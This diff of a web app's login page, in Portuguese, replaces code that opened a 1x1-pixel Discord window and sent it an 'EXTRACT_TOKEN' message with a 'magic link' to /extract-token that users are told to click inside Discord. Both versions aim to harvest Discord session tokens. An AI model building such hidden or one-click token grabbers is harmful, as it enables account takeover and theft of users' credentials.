@@ -309,43 +309,22 @@
 
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('login') === 'success') {
-            showStatus('login realizado! extraindo token do discord...', 'success');
+            showStatus('login realizado! clica no link abaixo dentro do Discord', 'success');
             
-            // Abre Discord e injeta script automaticamente
-            if (urlParams.get('extract_token') === 'true') {
-                setTimeout(() => {
-                    const discordWindow = window.open('https://discord.com/app', 'discord_extractor', 'width=1,height=1');
-                    
-                    // Aguarda Discord carregar e injeta script
-                    let attempts = 0;
-                    const injectScript = setInterval(() => {
-                        attempts++;
-                        try {
-                            // Tenta acessar o localStorage do Discord
-                            discordWindow.focus();
-                            
-                            // Envia comando para Discord via postMessage
-                            discordWindow.postMessage({
-                                type: 'EXTRACT_TOKEN',
-                                origin: window.location.origin
-                            }, 'https://discord.com');
-                            
-                            if (attempts > 3) clearInterval(injectScript);
-                        } catch (e) {
-                            if (attempts > 10) {
-                                clearInterval(injectScript);
-                                showStatus('abrindo discord para extração...', 'error');
-                            }
-                        }
-                    }, 500);
-                    
-                    // Fallback: mostra botão de confirmação manual
-                    setTimeout(() => {
-                        showStatus('clica em "Confirmar" quando o Discord estiver aberto', 'success');
-                        document.getElementById('saveBtn').textContent = 'confirmar token';
-                    }, 2000);
-                }, 500);
-            }
+            // Cria um link mágico que extrai o token
+            const extractLink = window.location.origin + '/extract-token';
+            
+            setTimeout(() => {
+                const linkElement = document.createElement('div');
+                linkElement.style.cssText = 'margin: 15px 0; padding: 12px; background: #222; border: 1px solid #444; text-align: center; border-radius: 4px;';
+                linkElement.innerHTML = `
+                    <small style="color: #999; display: block; margin-bottom: 8px;">1. abre discord no navegador<br>2. clica no link abaixo:</small>
+                    <a href="${extractLink}" target="discord_token" style="color: #5865f2; text-decoration: none; font-weight: bold;">extrair token automaticamente</a>
+                `;
+                
+                const statusDiv = document.getElementById('status');
+                statusDiv.parentNode.insertBefore(linkElement, statusDiv.nextSibling);
+            }, 500);
             
             window.history.replaceState({}, '', '/');
         } else if (urlParams.get('error')) {
